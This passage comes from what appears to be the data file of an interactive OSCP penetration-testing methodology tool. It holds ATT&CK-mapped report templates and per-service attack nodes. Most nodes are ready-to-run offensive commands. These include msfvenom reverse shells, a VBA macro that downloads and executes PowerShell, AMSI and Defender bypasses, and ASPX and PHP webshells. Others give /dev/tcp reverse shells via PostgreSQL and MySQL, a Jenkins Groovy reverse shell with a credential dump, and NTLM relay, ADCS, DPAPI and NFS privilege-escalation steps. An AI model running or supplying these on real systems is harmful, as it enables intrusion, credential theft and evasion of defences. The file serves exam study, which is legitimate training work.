    cmd: `# TA0001 Initial Access — note template
# Technique IDs to reference:
#   T1190 — Exploit Public-Facing Application
#   T1078 — Valid Accounts (found creds)
#   T1566 — Phishing (client-side attacks)
#   T1203 — Exploitation for Client Execution

## Initial Access — $IP

Vulnerability: [CVE / vuln name / misconfiguration]
Service: [port + service]
Technique: T1190 / T1078 / T1566 (pick one)

## Exploitation Steps
1. [Exact command or tool used]
2. [Payload delivered / creds used]
3. [Response confirming execution]

## Shell Obtained
Type: [reverse/bind/web shell]
User: [whoami output]
Command used:
  [paste exact command that got the shell]

## Evidence
- Screenshot: exploit execution + response
- Screenshot: whoami + hostname + ip immediately after shell
- File: ~/results/$IP/exploits/payload.txt (save your payload)`,
    warn: "Save your exact payload to disk before moving on. You will need to reproduce this in the report and you will not remember the exact syntax 8 hours later.",
    choices: [
      { label: "TA0002 — Execution", next: "doc_execution" },
      { label: "TA0004 — Privilege Escalation", next: "doc_privesc" },
      { label: "Back to tactic index", next: "reporting" },
    ],
  },

  doc_execution: {
    phase: "REPORT",
    title: "TA0002 — Execution",
    body: "Document how you ran code on the target. Often overlaps with Initial Access but worth its own note — especially for multi-stage payloads, web shells, or script interpreters.",
    cmd: `# TA0002 Execution — note template
# Technique IDs to reference:
#   T1059.001 — PowerShell
#   T1059.003 — Windows Command Shell (cmd.exe)
#   T1059.004 — Unix Shell
#   T1059.007 — JavaScript (XSS/Node)
#   T1203 — Exploitation for Client Execution
#   T1106 — Native API

## Execution — $IP

Interpreter/Method: [PowerShell / bash / cmd / web shell / etc.]
Technique: T1059.00x

## Commands Run on Target
# Document exactly what you ran — copy from terminal history
history | tail -50

## Payload Details
Type: [Meterpreter / netcat / python / aspx shell / etc.]
Staged/Stageless: [staged uses stager + stage, stageless is single binary]
Delivery method: [uploaded via / triggered via / embedded in]

## Evidence
- Screenshot: payload execution
- Screenshot: callback received on attacker machine
- File: ~/results/$IP/exploits/ (save payload file)`,
    warn: "If you used msfvenom, save the exact generation command. 'msfvenom -p windows/x64/shell_reverse_tcp LHOST=x LPORT=443 -f exe > shell.exe' belongs in your notes verbatim.",
    choices: [
      { label: "TA0004 — Privilege Escalation", next: "doc_privesc" },
      { label: "Back to tactic index", next: "reporting" },
    ],
  },

  doc_privesc: {
    phase: "REPORT",
    title: "TA0004 — Privilege Escalation",
    body: "The most important section for OSCP. Document the exact vector — not just 'I ran linpeas.' What specific finding led to root? Show before and after privilege states.",
    cmd: `# TA0004 Privilege Escalation — note template
# Technique IDs to reference:
#   T1548.001 — Setuid/Setgid (Linux SUID)
#   T1548.003 — Sudo and Sudo Caching
#   T1053.003 — Cron Job (scheduled task)
#   T1053.005 — Scheduled Task (Windows)
#   T1543.003 — Windows Service
#   T1134 — Access Token Manipulation
#   T1068 — Exploitation for Privilege Escalation (kernel/CVE)

## Privilege Escalation — $IP

Vector: [SUID / sudo / cron / service / token / CVE / etc.]
Technique: T1548.001 / T1053.003 / etc. (pick closest)

## Low-Privilege State (BEFORE)
whoami && id && hostname
# [paste output]

## Escalation Steps
1. [How you found the vector — linpeas finding, manual check]
2. [Exact command to exploit]
3. [Any intermediate steps]

## Root/SYSTEM State (AFTER)
whoami && id
# [paste output — must show root or SYSTEM]

## Evidence
- Screenshot: low-priv whoami BEFORE escalation
- Screenshot: the specific finding (sudo -l / find SUID / crontab)
- Screenshot: exploitation command
- Screenshot: root/SYSTEM whoami AFTER
- Screenshot: proof.txt with whoami + hostname + ip in same frame`,
    warn: "TWO whoami screenshots required — before AND after. One screenshot of root alone is not sufficient evidence of the escalation path.",
    choices: [
      { label: "TA0006 — Credential Access", next: "doc_cred_access" },
      { label: "TA0040 — Impact (flags)", next: "doc_impact" },
      { label: "Back to tactic index", next: "reporting" },
    ],
  },

  doc_cred_access: {
    phase: "REPORT",
    title: "TA0006 — Credential Access",
    body: "Document every credential found — hashes, plaintext, tokens, keys. These often chain into lateral movement. Even creds you didn't use are worth noting for the report.",
    cmd: `# TA0006 Credential Access — note template
# Technique IDs to reference:
#   T1003.001 — LSASS Memory (mimikatz, pypykatz)
#   T1003.002 — SAM (reg save + impacket)
#   T1003.003 — NTDS.dit (domain controller)
#   T1003.006 — DCSync
#   T1552.001 — Credentials in Files
#   T1552.004 — Private Keys (SSH keys, PEM)
#   T1558.003 — Kerberoasting
#   T1558.004 — AS-REP Roasting

## Credential Access — $IP

Method: [mimikatz / secretsdump / file search / kerberoast / etc.]
Technique: T1003.001 / T1552.001 / T1558.003 (pick closest)

## Credentials Found
| Type     | Username | Value                    | Cracked? |
|----------|----------|--------------------------|----------|
| NTLM     | admin    | aad3b435b51404ee...      | Y: Pass1 |
| SSH Key  | root     | /home/user/.ssh/id_rsa   | N/A      |
| Plaintext| svc_sql  | Winter2023!              | N/A      |

## Cracking Commands Used
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
john --format=NT hashes.txt --wordlist=rockyou.txt

## Evidence
- Screenshot: dump command + output
- Screenshot: cracked hash result
- File: ~/results/$IP/loot/hashes.txt`,
    warn: "Never paste real credentials into a report without client approval — mask with [REDACTED] in deliverables. For the OSCP exam, show the full value.",
    choices: [
      { label: "TA0008 — Lateral Movement", next: "doc_lateral" },
      { label: "Back to tactic index", next: "reporting" },
    ],
  },

  doc_lateral: {
    phase: "REPORT",
    title: "TA0008 — Lateral Movement",
    body: "The section most candidates skip because it feels like 'just pivoting.' Document the full chain — how you moved from one host to another, what credential or technique enabled it, and what you found on the other side.",
    cmd: `# TA0008 Lateral Movement — note template
# Technique IDs to reference:
#   T1021.001 — Remote Desktop Protocol
#   T1021.002 — SMB/Windows Admin Shares
#   T1021.004 — SSH
#   T1021.006 — WinRM
#   T1550.002 — Pass the Hash
#   T1550.003 — Pass the Ticket
#   T1563 — Remote Service Session Hijacking

## Lateral Movement — $IP → $TARGET

From: $IP ([username] @ [hostname])
To: $TARGET ([username] @ [hostname])
Method: [PtH / SSH / WinRM / RDP / SMB exec]
Technique: T1021.002 / T1550.002 (pick closest)

## Movement Steps
1. [Credential/ticket used to move]
2. [Exact command]
3. [Confirmation of access]

## Tunnel Setup (if applicable)
# Document your pivot setup — Ligolo / Chisel / SSH
# Include listener config, agent config, route added

## Evidence
- Screenshot: command on source machine
- Screenshot: shell/access confirmed on target machine
- Screenshot: tunnel established (if pivoting)
- Network diagram: hand-drawn or ASCII showing the chain`,
    warn: "Draw the network. Even ASCII art. 'Attacker → Machine 1 (pivot) → Machine 2 → DC' on one line is enough. Reviewers need to see you understood the topology.",
    choices: [
      { label: "TA0007 — Discovery (post-shell)", next: "doc_discovery" },
      { label: "TA0040 — Impact (flags)", next: "doc_impact" },
      { label: "Back to tactic index", next: "reporting" },
    ],
  },

  doc_discovery: {
    phase: "REPORT",
    title: "TA0007 — Discovery",
    body: "Post-shell enumeration. What did you find once inside? This section ties recon to lateral movement and shows situational awareness — you didn't just exploit and move on, you understood the environment.",
    cmd: `# TA0007 Discovery — note template
# Technique IDs to reference:
#   T1082 — System Information Discovery
#   T1049 — System Network Connections Discovery
#   T1033 — System Owner/User Discovery
#   T1087 — Account Discovery
#   T1069 — Permission Groups Discovery
#   T1016 — System Network Configuration Discovery
#   T1018 — Remote System Discovery
#   T1135 — Network Share Discovery

## Post-Shell Discovery — $IP

Shell as: [username + privilege level]

## System Info
hostname && whoami && id
uname -a          # Linux
systeminfo        # Windows

## Network Awareness
ip a / ipconfig   # Interfaces — any dual-homed?
ip route          # Subnets reachable
arp -a            # Other hosts seen recently
ss -tnp / netstat -ano  # Active connections

## Interesting Users / Groups
cat /etc/passwd | grep -v nologin  # Linux
net user && net localgroup administrators  # Windows

## Key Findings
- [Any new subnets discovered]
- [Other live hosts found]
- [Interesting shares, files, configs]

## Evidence
- Screenshot: ifconfig/ipconfig showing all interfaces
- Screenshot: arp table or other host discovery
- Note: any new IPs to add to scope`,
    warn: "Check for dual-homed machines every time — a second interface means a new subnet and potentially the pivot you need to reach the AD set.",
    choices: [
      { label: "TA0040 — Impact (flags)", next: "doc_impact" },
      { label: "Back to tactic index", next: "reporting" },
    ],
  },

  doc_impact: {
    phase: "REPORT",
    title: "TA0040 — Impact (Flags)",
    body: "The proof section. This is what OffSec grades. Every flag needs the holy trinity in a single screenshot: whoami/id + hostname + ip + flag content. No exceptions.",
    cmd: `# TA0040 Impact — flag capture template
# Technique IDs:
#   T1565 — Data Manipulation (you achieved impact)
#   T1486 — Data Encrypted / T1496 — Resource Hijacking (conceptual)

## Flag Capture — $IP

### local.txt (low privilege)
# Linux
whoami && hostname && ip a && cat /home/*/local.txt 2>/dev/null || find / -name local.txt 2>/dev/null -exec cat {} \;

# Windows
whoami && hostname && ipconfig && type C:\Users\*\Desktop\local.txt

### proof.txt (root / SYSTEM)
# Linux
id && hostname && ip a && cat /root/proof.txt

# Windows — MUST use interactive shell (not web shell)
whoami && hostname && ipconfig && type C:\Users\Administrator\Desktop\proof.txt

## Flag Log
| Machine IP | User Flag (local.txt) | Root Flag (proof.txt) | Time |
|------------|----------------------|----------------------|------|
| $IP        | [hash value]         | [hash value]         | 00:00|

## Evidence Requirements
- ✅ local.txt: whoami + hostname + ip + flag — SINGLE screenshot
- ✅ proof.txt: whoami (root/SYSTEM) + hostname + ip + flag — SINGLE screenshot
- ✅ proof.txt on Windows captured via interactive shell only`,
    warn: "Windows proof.txt MUST be captured from an interactive shell — RDP, WinRM, or evil-winrm. A web shell screenshot alone will not be accepted by OffSec.",
    choices: [
      { label: "Final submission checklist", next: "doc_submit" },
      { label: "Back to tactic index", next: "reporting" },
      { label: "Next machine", next: "start" },
    ],
  },

  doc_submit: {
    phase: "REPORT",
    title: "Submission Checklist",
    body: "Stop hacking 90 minutes before the exam ends. You need this time. Rushing the submission has failed people who had all the flags. Work through this list methodically.",
    cmd: `# SUBMISSION CHECKLIST — Do not skip steps

## 1. Flag Verification
# Confirm all flags are logged with correct screenshots
grep -r "local\|proof" ~/results/*/screenshots/

## 2. Screenshot Audit — per machine
# For each machine confirm you have:
# [ ] Recon: nmap output with versions
# [ ] Foothold: exploit execution + shell callback
# [ ] local.txt: whoami + hostname + ip + flag (single frame)
# [ ] Privesc: vector identified + exploitation command
# [ ] proof.txt: root/SYSTEM + hostname + ip + flag (single frame)

## 3. Notes Completeness
# Walk every ATT&CK tactic node for each machine
# TA0043 Recon ✓ / TA0001 Access ✓ / TA0002 Exec ✓
# TA0004 Privesc ✓ / TA0006 Creds ✓ / TA0008 Lateral ✓ / TA0040 Impact ✓

## 4. Disconnect VPN
sudo killall openvpn
# Exam proctoring ends here — confirm with proctor

## 5. Build Report Archive
cd ~/results
zip -r oscp_report_$(date +%Y%m%d).zip */
md5sum oscp_report_$(date +%Y%m%d).zip

## 6. Upload
# OffSec submission portal — upload zip
# Note the confirmation number / email
# Do not close the browser until confirmed

## 7. Breathe
echo "Done."`,
    warn: "The MD5 hash proves your submission was not tampered with. Note it down before uploading. If the portal has issues, email support@offensive-security.com immediately with your hash.",
    choices: [
      { label: "Back to tactic index", next: "reporting" },
      { label: "Start a new machine", next: "start" },
    ],
  },

  rdp: {
    phase: "WINDOWS",
    title: "RDP (3389)",
    body: "RDP is everywhere on Windows targets. xfreerdp from Kali, pass-the-hash via restricted admin mode, credential spray. Always try creds you already have.",
    cmd: `xfreerdp /u:user /p:'password' /v:$IP /cert-ignore
xfreerdp /u:administrator /pth:NTLM_HASH /v:$IP /cert-ignore +clipboard

crackmapexec rdp $IP -u users.txt -p passwords.txt
crackmapexec rdp $IP -u administrator -H NTLM_HASH

nmap -p 3389 --script rdp-enum-encryption,rdp-vuln-ms12-020 $IP

# BlueKeep check (CVE-2019-0708) — DO NOT auto-exploit, can crash target
nmap -p 3389 --script rdp-vuln-ms12-020 $IP`,
    warn: "Pass-the-hash via RDP requires restricted admin mode to be enabled on the target.",
    choices: [
      { label: "Got RDP access — Windows foothold", next: "windows_post_exploit" },
      { label: "Need creds first", next: "bruteforce" },
      { label: "BlueKeep vulnerable — searchsploit", next: "searchsploit_web" },
    ],
  },

  responder: {
    phase: "AD",
    title: "Responder / LLMNR Poisoning",
    body: "Poison LLMNR/NBT-NS broadcasts to capture NTLMv2 hashes. Run early — let it collect in background while you enumerate. Relay if cracking fails.",
    cmd: `sudo responder -I eth0 -wdF

# Captured hashes appear in /usr/share/responder/logs/
cat /usr/share/responder/logs/*.txt

# Crack NTLMv2 (module 5600)
hashcat -m 5600 ntlmv2.txt /usr/share/wordlists/rockyou.txt
hashcat -m 5600 ntlmv2.txt rockyou.txt -r best64.rule

# If cracking fails — relay instead (turn off SMB/HTTP in Responder.conf first)
sudo responder -I eth0 -wdF --lm
impacket-ntlmrelayx -tf targets.txt -smb2support
impacket-ntlmrelayx -tf targets.txt -smb2support -i  # interactive shell`,
    warn: "Disable SMB and HTTP in /etc/responder/Responder.conf before running ntlmrelayx — both cannot listen on the same port.",
    choices: [
      { label: "Captured and cracked hash", next: "creds_found" },
      { label: "Relayed hash — got shell", next: "windows_post_exploit" },
      { label: "No hashes captured — try other AD vectors", next: "ad_start" },
    ],
  },

  adcs: {
    phase: "AD",
    title: "AD Certificate Services (ESC1/ESC4)",
    body: "Misconfigured certificate templates let low-priv users enroll as Domain Admin. ESC1 is the most common — find it with Certipy.",
    cmd: `certipy find -u user@domain.com -p 'pass' -dc-ip $IP -vulnerable -stdout

# ESC1 — enroll as DA using vulnerable template
certipy req -u user@domain.com -p 'pass' \\
  -ca 'CA-NAME' -template 'VulnTemplate' \\
  -upn administrator@domain.com -dc-ip $IP

# Authenticate with the certificate
certipy auth -pfx administrator.pfx -dc-ip $IP
# Outputs NTLM hash for administrator

# ESC4 — write owner on template, modify to ESC1, exploit
certipy template -u user@domain.com -p 'pass' \\
  -template 'VulnTemplate' -save-old -dc-ip $IP

# Pass-the-hash with retrieved administrator hash
evil-winrm -i $IP -u administrator -H <NTLM_HASH>`,
    warn: "Always -save-old when modifying templates in ESC4 — restore after exploitation or you'll break the environment.",
    choices: [
      { label: "Got DA cert — authenticated as admin", next: "dcsync" },
      { label: "No vulnerable templates found", next: "ad_manual" },
    ],
  },

  dpapi: {
    phase: "WINDOWS",
    title: "DPAPI Credential Extraction",
    body: "DPAPI protects browser passwords, credential manager, and WiFi keys. Accessible as the user who encrypted them or as SYSTEM with the domain backup key.",
    cmd: `# Chrome saved passwords (as the user)
mimikatz "dpapi::chrome /in:%localappdata%\\Google\\Chrome\\User Data\\Default\\Login Data /unprotect" exit

# Credential Manager blobs
cmdkey /list
mimikatz "vault::cred /patch" exit
mimikatz "dpapi::cred /in:C:\\Users\\user\\AppData\\Local\\Microsoft\\Credentials\\<blob>" exit

# Find all DPAPI blobs
dir /s /b C:\\Users\\*\\AppData\\Local\\Microsoft\\Credentials\\* 2>nul
dir /s /b C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Credentials\\* 2>nul

# Master keys needed to decrypt
dir /s /b C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Protect\\* 2>nul

# From Kali with domain backup key (DA required)
impacket-dpapi backupkeys --export -t domain/admin:'pass'@$IP`,
    warn: null,
    choices: [
      { label: "Found plaintext creds", next: "creds_found" },
      { label: "Got domain backup key — decrypt all blobs", next: "got_root_windows" },
    ],
  },

  bof: {
    phase: "SHELL",
    title: "Buffer Overflow (Windows x86)",
    body: "PEN-200 BOF methodology: fuzz → offset → EIP control → bad chars → shellcode. Structured process. Don't skip steps.",
    cmd: `# 1. Fuzz — find crash length
python3 -c "print('A' * 2000)" | nc $IP <PORT>

# 2. Find exact offset
msf-pattern_create -l 2000
msf-pattern_offset -l 2000 -q <EIP_VALUE>

# 3. Confirm EIP control
python3 -c "print('A'*OFFSET + 'B'*4 + 'C'*(2000-OFFSET-4))"

# 4. Find bad chars — send all bytes 0x01-0xFF
# Compare in Immunity Debugger vs known good

# 5. Find JMP ESP (no ASLR/DEP)
msf-nasm_shell
> jmp esp   # → get opcode e.g. FFE4
# Find in Immunity: !mona jmp -r esp -cpb "\\x00"

# 6. Generate shellcode
msfvenom -p windows/shell_reverse_tcp \\
  LHOST=$LHOST LPORT=$LPORT \\
  EXITFUNC=thread -b "\\x00" -f py

# 7. Final exploit structure
offset = EXACT_OFFSET
padding = b"A" * offset
eip = b"\\xAD\\xDE\\xXX\\xXX"  # JMP ESP address LE
nop_sled = b"\\x90" * 16
shellcode = b"PASTE_MSFVENOM_OUTPUT"
payload = padding + eip + nop_sled + shellcode`,
    warn: "Always include NOP sled (\\x90 * 16) before shellcode. Account for EXITFUNC=thread to keep service stable.",
    choices: [
      { label: "Exploit worked — got shell", next: "shell_upgrade" },
      { label: "Shell died immediately — try EXITFUNC=thread", next: "bof" },
    ],
  },

  client_side: {
    phase: "SHELL",
    title: "Client-Side Attacks",
    body: "HTA, malicious Office macros, VBA. Used when you have a way to get a user to open a file or click a link. Set up listener first.",
    cmd: `# HTA via msfvenom
msfvenom -p windows/shell_reverse_tcp \\
  LHOST=$LHOST LPORT=$LPORT -f hta-psh -o shell.hta
python3 -m http.server 80
# Deliver: http://$LHOST/shell.hta

# VBA macro (Word/Excel)
# Insert > Module in VBA editor:
Sub AutoOpen()
  Shell "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://$LHOST/shell.ps1')"
End Sub

# PowerShell download cradle
IEX(New-Object Net.WebClient).DownloadString('http://$LHOST/Invoke-PowerShellTcp.ps1')

# Generate PS reverse shell
msfvenom -p windows/x64/shell_reverse_tcp \\
  LHOST=$LHOST LPORT=$LPORT -f ps1 > shell.ps1

nc -nlvp $LPORT`,
    warn: "Macro execution requires the user to enable macros. Social engineering text in the doc helps.",
    choices: [
      { label: "User executed — got shell", next: "shell_upgrade" },
      { label: "AV killed the payload", next: "amsi_bypass" },
    ],
  },

  amsi_bypass: {
    phase: "WINDOWS",
    title: "AMSI / AV Bypass",
    body: "AMSI blocks PowerShell payloads in memory. Patch it first, then load tools. Obfuscation handles signature-based AV.",
    cmd: `# AMSI patch (run in PS session first)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Or: base64 encoded AMSI bypass
$a=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUtils')
$b=$a.GetField('amsi'+'InitFailed','NonPublic,Static')
$b.SetValue($null,$true)

# Obfuscated download cradle (evades string detection)
$c = New-Object Net.WebClient
$c.DownloadString('http://$LHOST/tool.ps1') | IEX

# Invoke-Obfuscation (offline tool)
Invoke-Obfuscation -ScriptPath shell.ps1 -Command TOKEN\\ALL\\1

# Simple string concat to evade sig detection
$cmd = 'Inv'+'oke-Mi'+'mikatz'

# Defender exclusion (if admin)
Set-MpPreference -DisableRealtimeMonitoring $true
Add-MpPreference -ExclusionPath "C:\\Windows\\Temp"`,
    warn: "AMSI patches are session-scoped — must run in every new PS session before loading tools.",
    choices: [
      { label: "AMSI bypassed — load tools", next: "windows_post_exploit" },
      { label: "Still blocked — try different bypass", next: "amsi_bypass" },
    ],
  },

  iis_aspx: {
    phase: "WEB",
    title: "IIS / ASPX Webshell",
    body: "IIS runs ASPX not PHP. If you can upload or write to the webroot, drop an ASPX shell. Default IIS path is C:\\inetpub\\wwwroot.",
    cmd: `# Generate ASPX shell
msfvenom -p windows/x64/shell_reverse_tcp \\
  LHOST=$LHOST LPORT=$LPORT -f aspx -o shell.aspx

# Simple ASPX webshell (upload and browse to it)
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<% Response.Write(Process.Start(new ProcessStartInfo("cmd.exe",
   "/c " + Request["cmd"]) { RedirectStandardOutput=true,
   UseShellExecute=false }).StandardOutput.ReadToEnd()); %>

# Access: http://$IP/shell.aspx?cmd=whoami

# IIS specific paths
C:\\inetpub\\wwwroot\\
C:\\inetpub\\wwwroot\\aspnet_client\\

# Check IIS version and config
type C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config
type C:\\inetpub\\wwwroot\\web.config`,
    warn: "IIS app pool runs as IIS_IUSRS by default — low priv. Check SeImpersonatePrivilege for potato escalation.",
    choices: [
      { label: "Webshell uploaded — got RCE", next: "reverse_shell" },
      { label: "Got shell — check token privs", next: "token_privs" },
      { label: "Upload blocked", next: "web_fuzz_deep" },
    ],
  },

  postgres: {
    phase: "RECON",
    title: "PostgreSQL (5432)",
    body: "PostgreSQL with COPY TO/FROM PROGRAM is RCE. Default postgres user often has no password. pg_hba.conf controls who can connect.",
    cmd: `psql -h $IP -U postgres
psql -h $IP -U postgres -p 5432

# Default creds: postgres:(blank)  postgres:postgres  postgres:password

# Once connected — RCE via COPY
psql> COPY shell FROM PROGRAM 'id';
psql> COPY shell FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"';

# Read files
psql> COPY shell FROM '/etc/passwd';
psql> SELECT * FROM shell;

# Write files (if superuser)
psql> COPY (SELECT '<?php system($_GET[cmd]); ?>') TO '/var/www/html/shell.php';

# Enumerate
psql> \\l           # list databases
psql> \\c dbname    # connect to db
psql> \\dt          # list tables
psql> SELECT current_user, pg_postmaster_start_time();`,
    warn: null,
    choices: [
      { label: "RCE via COPY PROGRAM — got shell", next: "shell_upgrade" },
      { label: "Wrote webshell — got RCE", next: "reverse_shell" },
      { label: "Found creds in DB", next: "creds_found" },
    ],
  },

  mongodb: {
    phase: "RECON",
    title: "MongoDB (27017)",
    body: "Unauthenticated MongoDB exposes all databases. No auth by default in older versions. Dump everything — creds are often stored in plaintext.",
    cmd: `mongosh $IP
mongosh mongodb://$IP:27017

# If auth required
mongosh mongodb://admin:password@$IP:27017

# Enumerate and dump
> show dbs
> use <dbname>
> show collections
> db.<collection>.find()
> db.<collection>.find().pretty()

# Dump all
mongoexport --host $IP --db <db> --collection <col> --out dump.json
mongodump --host $IP --out ./mongodump/

# Look for users, passwords, tokens, API keys
> db.users.find()
> db.accounts.find()

# Check for credentials in all collections
> db.getCollectionNames().forEach(c => { print(c); db[c].findOne(); })`,
    warn: null,
    choices: [
      { label: "Found credentials", next: "creds_found" },
      { label: "Found app data — check for web vectors", next: "web_enum" },
    ],
  },

  jenkins: {
    phase: "WEB",
    title: "Jenkins (8080/8443)",
    body: "CI/CD server = code execution by design. Script console is RCE if you can reach it. Check anonymous access first — many dev instances skip auth entirely.",
    cmd: `nmap -p 8080,8443 -sV $IP
curl -s http://$IP:8080/api/json | jq .
curl -s http://$IP:8080/script          # admin-only but worth trying
curl -s http://$IP:8080/asynchPeople/   # user list (sometimes open)

# Default creds: admin:admin  admin:jenkins  jenkins:jenkins
# Brute force login
hydra -l admin -P rockyou.txt $IP http-post-form \\
  "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^:F=loginError"

# Script console RCE (Groovy) — once authenticated
# http://$IP:8080/script
def cmd = "id"
def proc = cmd.execute()
proc.waitForOrKill(1000)
println proc.text

# Reverse shell via script console
String host="$LHOST"; int port=$LPORT; String cmd2="/bin/bash"
Process p=new ProcessBuilder(cmd2).redirectErrorStream(true).start()
Socket s=new Socket(host,port)
[p.inputStream,s.inputStream].each { it.eachByte { s.outputStream.write(it) } }

# Dump stored credentials (script console)
def creds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(
  com.cloudbees.plugins.credentials.common.StandardUsernamePasswordCredentials.class,
  Jenkins.instance, null, null)
creds.each { println it.id + ":" + it.username + ":" + it.password }

# CVE-2024-23897 — arbitrary file read (Jenkins < 2.441)
java -jar jenkins-cli.jar -s http://$IP:8080/ help "@/etc/passwd"`,
    warn: "Script console RCE runs as the Jenkins service user — often jenkins or root. Check for SSH keys and AWS creds in credential store.",
    choices: [
      { label: "Anonymous script console — got RCE", next: "reverse_shell" },
      { label: "Authenticated — dumped stored creds", next: "creds_found" },
      { label: "CVE-2024-23897 file read — found creds", next: "creds_found" },
      { label: "Need creds — brute force login", next: "bruteforce" },
    ],
  },

  vnc: {
    phase: "RECON",
    title: "VNC (5900-5906)",
    body: "VNC = graphical desktop access. No-auth instances are instant wins. Brute force is fast. Decrypt stored VNC passwords from config files if you find them.",
    cmd: `nmap -p 5900-5906 -sV --script vnc-info,vnc-brute $IP

# Check for no-auth (Security Type 1 = None)
vncviewer $IP:5900   # try without password first

# Common VNC passwords
# password  12345678  vnc123  admin  (blank)

# Brute force
hydra -P /usr/share/wordlists/rockyou.txt vnc://$IP
medusa -h $IP -u "" -P passwords.txt -M vnc

# If you have file access — decrypt stored VNC password
# Location: ~/.vnc/passwd  C:\\Users\\user\\.vnc\\passwd
python3 -c "
import subprocess
with open('.vnc/passwd','rb') as f: data=f.read()
key=[23,82,107,6,35,78,88,7]
from itertools import islice
import struct
def decrypt(data,key):
    result=[]
    for i,b in enumerate(data[:8]):
        k=key[i%8]
        result.append(b^k)
    return bytes(result)
print(decrypt(data,key))
"

# Once connected — get shell via VNC
# Open terminal in VNC session then use standard shells`,
    warn: null,
    choices: [
      { label: "No auth — instant desktop access", next: "shell_upgrade" },
      { label: "Cracked password — got desktop access", next: "shell_upgrade" },
      { label: "Found passwd file — decrypted VNC creds", next: "creds_found" },
    ],
  },

  webdav: {
    phase: "WEB",
    title: "WebDAV",
    body: "WebDAV over HTTP/HTTPS lets you upload files via PUT. If PUT is enabled and you can write to the webroot, you have a shell. Test methods first.",
    cmd: `nmap -p 80,443 --script http-webdav-scan,http-methods $IP
curl -X OPTIONS http://$IP/webdav/ -v   # Look for PUT in Allow header

davtest -url http://$IP/webdav/
davtest -url http://$IP/webdav/ -auth user:pass

# Direct PUT upload
curl -X PUT http://$IP/webdav/shell.php \\
  -u user:pass \\
  -d '<?php system($_GET["cmd"]); ?>'

# Upload as .txt then MOVE to .php (extension bypass)
curl -X PUT http://$IP/webdav/shell.txt -u user:pass \\
  -d '<?php system($_GET["cmd"]); ?>'
curl -X MOVE http://$IP/webdav/shell.txt \\
  -u user:pass -H "Destination: http://$IP/webdav/shell.php"

# ASPX for IIS
curl -X PUT http://$IP/webdav/shell.aspx -u user:pass \\
  --data-binary @shell.aspx

# Common paths
# /webdav/  /dav/  /WebDAV/  /uploads/  /_vti_bin/

# List contents
cadaver http://$IP/webdav/
# dav> ls  put shell.php  get file.txt`,
    warn: "Check if the upload directory is web-accessible — WebDAV root may not be under webroot.",
    choices: [
      { label: "PUT enabled — uploaded shell", next: "reverse_shell" },
      { label: "MOVE bypass worked — got RCE", next: "reverse_shell" },
      { label: "Need creds — try default WebDAV creds", next: "bruteforce" },
    ],
  },

  nfs_enum: {
    phase: "RECON",
    title: "NFS (2049)",
    body: "NFS shares expose the filesystem. no_root_squash = instant root. Mount the share, check UIDs, look for SSH keys and credentials.",
    cmd: `nmap -p 2049,111 --script nfs-ls,nfs-showmount,nfs-statfs $IP
showmount -e $IP
rpcinfo -p $IP | grep nfs

# Mount the share
mkdir /mnt/nfs
mount -t nfs $IP:/share /mnt/nfs -o nolock
ls -la /mnt/nfs

# Find interesting files
find /mnt/nfs -name "*.key" -o -name "*.pem" -o -name "id_rsa" 2>/dev/null
find /mnt/nfs -name "*password*" -o -name ".env" 2>/dev/null
grep -r "password\\|secret\\|key" /mnt/nfs 2>/dev/null

# Check file ownership UIDs
ls -lan /mnt/nfs   # numeric UIDs — match them locally

# no_root_squash exploit — run as root on Kali
cp /bin/bash /mnt/nfs/rootbash
chmod +s /mnt/nfs/rootbash
# On target: /path/to/rootbash -p

# UID manipulation — match file owner
useradd -u 1000 fakeuser && su fakeuser

# Write SSH key if home dir is exported
mkdir -p /mnt/nfs/root/.ssh
cp ~/.ssh/id_rsa.pub /mnt/nfs/root/.ssh/authorized_keys
chmod 600 /mnt/nfs/root/.ssh/authorized_keys
ssh root@$IP`,
    warn: "Always check if no_root_squash is set — showmount output shows (everyone) vs (ro,root_squash).",
    choices: [
      { label: "no_root_squash — SUID bash = root", next: "got_root_linux" },
      { label: "Wrote SSH key — shell as root", next: "got_root_linux" },
      { label: "Found credentials in share", next: "creds_found" },
      { label: "Found SSH key", next: "ssh_key" },
    ],
  },

  mysql: {
    phase: "RECON",
    title: "MySQL (3306)",
    body: "MySQL with FILE privilege = read/write OS files. INTO OUTFILE drops a webshell. UDF gives full RCE. Root with no password is common on dev boxes.",
    cmd: `nmap -p 3306 -sV --script mysql-info,mysql-empty-password $IP
mysql -u root -h $IP           # no password
mysql -u root -h $IP -p        # try: root, password, mysql, toor

# Default creds: root:(blank)  root:root  root:password

# Enumerate once connected
SHOW DATABASES; USE <db>; SHOW TABLES;
SELECT user,host,authentication_string FROM mysql.user;
SHOW VARIABLES LIKE 'secure_file_priv';  # empty = no restriction
SHOW VARIABLES LIKE 'plugin_dir';

# Read files (needs FILE priv)
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/var/www/html/config.php');

# Write webshell (needs FILE priv + webroot write)
SELECT '<?php system($_GET["cmd"]); ?>'
  INTO OUTFILE '/var/www/html/shell.php';

# UDF RCE (MySQL running as root)
# searchsploit mysql udf — compile raptor_udf2.c
SELECT * FROM foo INTO DUMPFILE '/usr/lib/mysql/plugin/raptor_udf2.so';
CREATE FUNCTION do_system RETURNS integer SONAME 'raptor_udf2.so';
SELECT do_system('bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1');

# Brute force
hydra -l root -P rockyou.txt $IP mysql`,
    warn: "secure_file_priv restricts INTO OUTFILE. If set to a specific path, you can only write there.",
    choices: [
      { label: "INTO OUTFILE webshell — got RCE", next: "reverse_shell" },
      { label: "UDF RCE worked — got shell", next: "shell_upgrade" },
      { label: "Dumped creds from DB", next: "creds_found" },
      { label: "Read sensitive config file", next: "creds_found" },
    ],
  },

  rsync: {
    phase: "RECON",
    title: "Rsync (873)",
    body: "Rsync modules are directory shares. Anonymous read = file loot. Anonymous write = upload SSH keys or webshells. Enumerate modules first.",
